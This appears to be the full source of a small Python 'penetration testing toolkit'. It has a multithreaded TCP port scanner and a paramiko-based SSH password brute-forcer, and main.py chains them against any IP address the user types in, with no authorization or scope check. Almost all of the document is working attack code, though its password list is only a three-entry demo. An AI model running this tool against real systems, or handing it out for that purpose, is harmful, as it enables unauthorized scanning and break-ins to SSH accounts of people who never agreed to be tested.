DIRECTORY STRUCTURE:

penetration_toolkit/
│
├── penetration_toolkit/
│   ├── __init__.py
│   ├── port_scanner.py
│   └── brute_forcer.py
│
├── setup.py
├── README.md
└── main.py


# penetration_toolkit/__init__.py
# This file makes the directory a package so we can import from it.

# penetration_toolkit/port_scanner.py
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(ip, port):
    """
    Try to connect to a given port on the target IP.
    Returns a tuple of (port, True/False) based on whether the port is open.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)  # Short timeout for faster scanning
            s.connect((ip, port))
            return port, True
    except:
        return port, False

def run_port_scanner(ip, ports, threads=100):
    """
    Scans a list of ports on the target IP using multithreading.
    Returns a list of open ports.
    """
    open_ports = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda p: scan_port(ip, p), ports)
        for port, is_open in results:
            if is_open:
                open_ports.append(port)
    return open_ports

# penetration_toolkit/brute_forcer.py
import paramiko

def ssh_brute_force(ip, username, password_list):
    """
    Attempts to brute force SSH login using a list of passwords.
    Returns the working password if found, or None.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(ip, username=username, password=password, timeout=2)
            return password  # Success!
        except:
            continue  # Try the next password
    return None

# main.py
# Entry point of the penetration testing toolkit.

import sys
import os

# Ensure local modules can be imported regardless of execution path
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, current_dir)

from penetration_toolkit import port_scanner, brute_forcer

def main():
    print("--- Welcome to the Penetration Testing Toolkit ---")

    # Prompt the user for the target IP address
    target_ip = input("Enter the IP address of the target: ")

    # Step 1: Port Scanning
    print("\n[*] Starting port scan on the target...")
    ports_to_scan = list(range(1, 1025))  # Common ports
    open_ports = port_scanner.run_port_scanner(target_ip, ports_to_scan)

    if open_ports:
        print(f"[+] Open ports detected: {open_ports}")
    else:
        print("[-] No open ports found.")

    # Step 2: SSH Brute Force (only if port 22 is open)
    if 22 in open_ports:
        print("\n[*] Port 22 is open. Starting SSH brute-force attack...")
        username = input("Enter the SSH username to brute-force: ")

        # For demo purposes; in a real scenario, load from a secure list
        password_list = ["admin", "password", "123456"]

        found_password = brute_forcer.ssh_brute_force(target_ip, username, password_list)

        if found_password:
            print(f"[+] SSH Login Successful! Password: '{found_password}'")
        else:
            print("[-] SSH brute-force failed. No valid password found.")
    else:
        print("[*] Skipping SSH brute-force since port 22 is closed.")

    print("\n--- Penetration Test Completed ---")

if __name__ == "__main__":
    main()
